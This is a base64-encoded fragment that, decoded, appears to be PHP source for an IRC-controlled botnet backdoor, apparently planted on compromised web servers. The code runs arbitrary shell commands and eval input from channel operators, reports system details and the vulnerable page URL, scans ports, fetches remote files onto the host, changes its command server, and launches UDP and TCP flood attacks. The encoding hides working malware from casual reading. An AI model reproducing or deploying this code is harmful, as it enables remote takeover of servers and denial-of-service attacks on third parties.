cyI6IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGlzc2V0KCRtY21kWzFdKSkgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaXAgPSBleHBsb2RlKCIuIiwkbWNtZFsxXSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGNvdW50KCRpcCk9PTQgJiYgaXNfbnVtZXJpYygkaXBbMF0pICYmIGlzX251bWVyaWMoJGlwWzFdKSAmJiBpc19udW1lcmljKCRpcFsyXSkgJiYgaXNfbnVtZXJpYygkaXBbM10pKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW1wyZG5zXDJdOiAiLiRtY21kWzFdLiIgPT4gIi5nZXRob3N0YnlhZGRyKCRtY21kWzFdKSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4xJ10sIltcMmRuc1wyXTogIi4kbWNtZFsxXS4iID0+ICIuZ2V0aG9zdGJ5YWRkcigkbWNtZFsxXSkpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuMiddLCJbXDJkbnNcMl06ICIuJG1jbWRbMV0uIiA9PiAiLmdldGhvc3RieWFkZHIoJG1jbWRbMV0pKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJkbnNcMl06ICIuJG1jbWRbMV0uIiA9PiAiLmdldGhvc3RieW5hbWUoJG1jbWRbMV0pKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbjEnXSwiW1wyZG5zXDJdOiAiLiRtY21kWzFdLiIgPT4gIi5nZXRob3N0YnluYW1lKCRtY21kWzFdKSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4yJ10sIltcMmRuc1wyXTogIi4kbWNtZFsxXS4iID0+ICIuZ2V0aG9zdGJ5bmFtZSgkbWNtZFsxXSkpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImluZm8iOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInZ1bmwiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChAaW5pX2dldCgic2FmZV9tb2RlIikgb3Igc3RydG9sb3dlcihAaW5pX2dldCgic2FmZV9tb2RlIikpID09ICJvbiIpIHsgJHNhZmVtb2RlID0gIm9uIjsgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgeyAkc2FmZW1vZGUgPSAib2ZmIjsgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR1bmFtZSA9IHBocF91bmFtZSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW1wyaW5mb1wyXTogJHVuYW1lIChzYWZlOiAkc2FmZW1vZGUpIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJ2dWxuXDJdOiBodHRwOi8vIi4kX1NFUlZFUlsnU0VSVkVSX05BTUUnXS4iIi4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXS4iIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbjEnXSwiW1wyaW5mb1wyXTogJHVuYW1lIChzYWZlOiAkc2FmZW1vZGUpIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbjEnXSwiW1wydnVsblwyXTogaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uIiIuJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10uIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4yJ10sIltcMmluZm9cMl06ICR1bmFtZSAoc2FmZTogJHNhZmVtb2RlKSIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4yJ10sIltcMnZ1bG5cMl06IGh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiIiLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLiIiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJ1bmFtZSI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEBpbmlfZ2V0KCJzYWZlX21vZGUiKSBvciBzdHJ0b2xvd2VyKEBpbmlfZ2V0KCJzYWZlX21vZGUiKSkgPT0gIm9uIikgeyAkc2FmZW1vZGUgPSAib24iOyB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7ICRzYWZlbW9kZSA9ICJvZmYiOyB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHVuYW1lID0gcGhwX3VuYW1lKCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJpbmZvXDJdOiAkdW5hbWUgKHNhZmU6ICRzYWZlbW9kZSkiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuMSddLCJbXDJpbmZvXDJdOiAkdW5hbWUgKHNhZmU6ICRzYWZlbW9kZSkiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuMiddLCJbXDJpbmZvXDJdOiAkdW5hbWUgKHNhZmU6ICRzYWZlbW9kZSkiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJybmRuaWNrIjogDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNldF9uaWNrKCk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJyYXciOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5zZW5kKHN0cnN0cigkbXNnLCRtY21kWzFdKSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJldmFsIjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRldmFsID0gZXZhbChzdWJzdHIoc3Ryc3RyKCRtc2csJG1jbWRbMV0pLHN0cmxlbigkbWNtZFsxXSkpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCgkJCSAgICAgICAgICAgICAgICBjYXNlICJzZXhlYyI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1hbmQgPSBzdWJzdHIoc3Ryc3RyKCRtc2csJG1jbWRbMF0pLHN0cmxlbigkbWNtZFswXSkrMSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRleGVjID0gc2hlbGxfZXhlYygkY29tbWFuZCk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXQgPSBleHBsb2RlKCJcbiIsJGV4ZWMpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IoJGk9MDskaTxjb3VudCgkcmV0KTskaSsrKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkcmV0WyRpXSE9TlVMTCkgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCIgICAgICA6ICIudHJpbSgkcmV0WyRpXSkpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiZXhlYyI6IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjb21tYW5kID0gc3Vic3RyKHN0cnN0cigkbXNnLCRtY21kWzBdKSxzdHJsZW4oJG1jbWRbMF0pKzEpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZXhlYyA9IGV4ZWMoJGNvbW1hbmQpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmV0ID0gZXhwbG9kZSgiXG4iLCRleGVjKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKCRpPTA7JGk8Y291bnQoJHJldCk7JGkrKykgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJHJldFskaV0hPU5VTEwpIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiICAgICAgOiAiLnRyaW0oJHJldFskaV0pKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInBhc3N0aHJ1IjogDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1hbmQgPSBzdWJzdHIoc3Ryc3RyKCRtc2csJG1jbWRbMF0pLHN0cmxlbigkbWNtZFswXSkrMSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRleGVjID0gcGFzc3RocnUoJGNvbW1hbmQpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmV0ID0gZXhwbG9kZSgiXG4iLCRleGVjKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKCRpPTA7JGk8Y291bnQoJHJldCk7JGkrKykgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJHJldFskaV0hPU5VTEwpIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiICAgICAgOiAiLnRyaW0oJHJldFskaV0pKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInBvcGVuIjogDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJG1jbWRbMV0pKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjb21tYW5kID0gc3Vic3RyKHN0cnN0cigkbXNnLCRtY21kWzBdKSxzdHJsZW4oJG1jbWRbMF0pKzEpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIltcMnBvcGVuXDJdOiAkY29tbWFuZCIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwaXBlID0gcG9wZW4oJGNvbW1hbmQsInIiKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUoIWZlb2YoJHBpcGUpKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYnVmID0gdHJpbShmZ2V0cygkcGlwZSw1MTIpKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJHBidWYgIT0gTlVMTCkgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCIgICAgIDogJHBidWYiKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2xvc2UoJHBpcGUpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9ICANCgkJCSAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInN5c3RlbSI6IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjb21tYW5kID0gc3Vic3RyKHN0cnN0cigkbXNnLCRtY21kWzBdKSxzdHJsZW4oJG1jbWRbMF0pKzEpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZXhlYyA9IHN5c3RlbSgkY29tbWFuZCk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXQgPSBleHBsb2RlKCJcbiIsJGV4ZWMpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IoJGk9MDskaTxjb3VudCgkcmV0KTskaSsrKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkcmV0WyRpXSE9TlVMTCkgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCIgICAgICA6ICIudHJpbSgkcmV0WyRpXSkpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAicHNjYW4iOiAvLyAucHNjYW4gMTI3LjAuMC4xIDY2NjcgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoY291bnQoJG1jbWQpID4gMikgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihmc29ja29wZW4oJG1jbWRbMV0sJG1jbWRbMl0sJGUsJHMsMTUpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJwc2NhblwyXTogIi4kbWNtZFsxXS4iOiIuJG1jbWRbMl0uIiBpcyBcMm9wZW5cMiIpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuMSddLCJbXDJwc2NhblwyXTogIi4kbWNtZFsxXS4iOiIuJG1jbWRbMl0uIiBpcyBcMm9wZW5cMiIpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuMiddLCJbXDJwc2NhblwyXTogIi4kbWNtZFsxXS4iOiIuJG1jbWRbMl0uIiBpcyBcMm9wZW5cMiIpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW1wycHNjYW5cMl06ICIuJG1jbWRbMV0uIjoiLiRtY21kWzJdLiIgaXMgXDJjbG9zZWRcMiIpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuMSddLCJbXDJwc2NhblwyXTogIi4kbWNtZFsxXS4iOiIuJG1jbWRbMl0uIiBpcyBcMmNsb3NlZFwyIik7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4yJ10sIltcMnBzY2FuXDJdOiAiLiRtY21kWzFdLiI6Ii4kbWNtZFsyXS4iIGlzIFwyY2xvc2VkXDIiKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfX0gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInVkLnNlcnZlciI6IC8vIC51ZC5zZXJ2ZXIgPHNlcnZlcj4gPHBvcnQ+IFtwYXNzd29yZF0gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoY291bnQoJG1jbWQpPjIpIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNvbmZpZ1snc2VydmVyJ10gPSAkbWNtZFsxXTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNvbmZpZ1sncG9ydCddID0gJG1jbWRbMl07IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGlzc2V0KCRtY21jZFszXSkpIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5jb25maWdbJ3Bhc3MnXSA9ICRtY21kWzNdOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJ1cGRhdGVcMl06IFNlcnZlciBiZXJ1YmFoIG1lbmphZGkgIi4kbWNtZFsxXS4iOiIuJG1jbWRbMl0uIiBTZW5oYTogIi4kbWNtZFszXSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuMSddLCJbXDJ1cGRhdGVcMl06IFNlcnZlciBiZXJ1YmFoIG1lbmphZGkgIi4kbWNtZFsxXS4iOiIuJG1jbWRbMl0uIiBTZW5oYTogIi4kbWNtZFszXSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuMiddLCJbXDJ1cGRhdGVcMl06IFNlcnZlciBiZXJ1YmFoIG1lbmphZGkgIi4kbWNtZFsxXS4iOiIuJG1jbWRbMl0uIiBTZW5oYTogIi4kbWNtZFszXSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW1wydXBkYXRlXDJdOiBTZXJ2ZXIgYmVydWJhaCBtZW5qYWRpICIuJG1jbWRbMV0uIjoiLiRtY21kWzJdKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbjEnXSwiW1wydXBkYXRlXDJdOiBTZXJ2ZXIgYmVydWJhaCBtZW5qYWRpICIuJG1jbWRbMV0uIjoiLiRtY21kWzJdKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbjInXSwiW1wydXBkYXRlXDJdOiBTZXJ2ZXIgYmVydWJhaCBtZW5qYWRpICIuJG1jbWRbMV0uIjoiLiRtY21kWzJdKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJkb3dubG9hZCI6IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGNvdW50KCRtY21kKSA+IDIpIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoISRmcCA9IGZvcGVuKCRtY21kWzJdLCJ3IikpIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJkb3dubG9hZFwyXTogVGlkYWsgZGFwYXQgZG93bmxvYWQuIElqaW4gZGl0b2xhay4iKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbjEnXSwiW1wyZG93bmxvYWRcMl06IFRpZGFrIGRhcGF0IGRvd25sb2FkLiBJamluIGRpdG9sYWsuIik7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4yJ10sIltcMmRvd25sb2FkXDJdOiBUaWRhayBkYXBhdCBkb3dubG9hZC4gSWppbiBkaXRvbGFrLiIpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZighJGdldCA9IGZpbGUoJG1jbWRbMV0pKSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW1wyZG93bmxvYWRcMl06IFRpZGFrIGRhcGF0IGRvd25sb2FkIFwyIi4kbWNtZFsxXS4iXDIiKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbjEnXSwiW1wyZG93bmxvYWRcMl06IFRpZGFrIGRhcGF0IGRvd25sb2FkIFwyIi4kbWNtZFsxXS4iXDIiKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbjInXSwiW1wyZG93bmxvYWRcMl06IFRpZGFrIGRhcGF0IGRvd25sb2FkIFwyIi4kbWNtZFsxXS4iXDIiKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yKCRpPTA7JGk8PWNvdW50KCRnZXQpOyRpKyspIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZndyaXRlKCRmcCwkZ2V0WyRpXSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJkb3dubG9hZFwyXTogRmlsZSBcMiIuJG1jbWRbMV0uIlwyIHRlbGFoIGRpZG93bmxvYWQga2UgXDIiLiRtY21kWzJdLiJcMiIpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuMSddLCJbXDJkb3dubG9hZFwyXTogRmlsZSBcMiIuJG1jbWRbMV0uIlwyIHRlbGFoIGRpZG93bmxvYWQga2UgXDIiLiRtY21kWzJdLiJcMiIpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuMiddLCJbXDJkb3dubG9hZFwyXTogRmlsZSBcMiIuJG1jbWRbMV0uIlwyIHRlbGFoIGRpZG93bmxvYWQga2UgXDIiLiRtY21kWzJdLiJcMiIpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZjbG9zZSgkZnApOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7IA0KCQkJCQkJCSAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW1wyZG93bmxvYWRcMl06IFNhbGFoIHBlcmludGFoIHBha2RoZSEhIik7DQoJCQkJCQkJICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbjEnXSwiW1wyZG93bmxvYWRcMl06IFNhbGFoIHBlcmludGFoIHBha2RoZSEhIik7DQoJCQkJCQkJICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbjEnXSwiW1wyZG93bmxvYWRcMl06IFNhbGFoIHBlcmludGFoIHBha2RoZSEhIik7DQoJCQkJCQkJICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJkaWUiOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2VuZCgiUVVJVCA6S2FzaWggbWFrYW4ga3VjaW5nIGR1bHUgJG5pY2siKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJHRoaXMtPmNvbm4pOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0OyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJsb2dvdXQiOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+bG9nX291dCgkaG9zdCk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW1wyYXV0aFwyXTogJG5pY2sgbG9nb3V0Iik7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4xJ10sIltcMmF1dGhcMl06ICRuaWNrIGxvZ291dCIpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuMiddLCJbXDJhdXRoXDJdOiAkbmljayBsb2dvdXQiKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInVkcGZsb29kIjogDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoY291bnQoJG1jbWQpPjMpIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnVkcGZsb29kKCRtY21kWzFdLCRtY21kWzJdLCRtY21kWzNdKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAidGNwZmxvb2QiOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihjb3VudCgkbWNtZCk+NSkgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+dGNwZmxvb2QoJG1jbWRbMV0sJG1jbWRbMl0sJG1jbWRbM10sJG1jbWRbNF0sJG1jbWRbNV0pOyANCiAgICAgICAgICAgICAgICAgICAgIC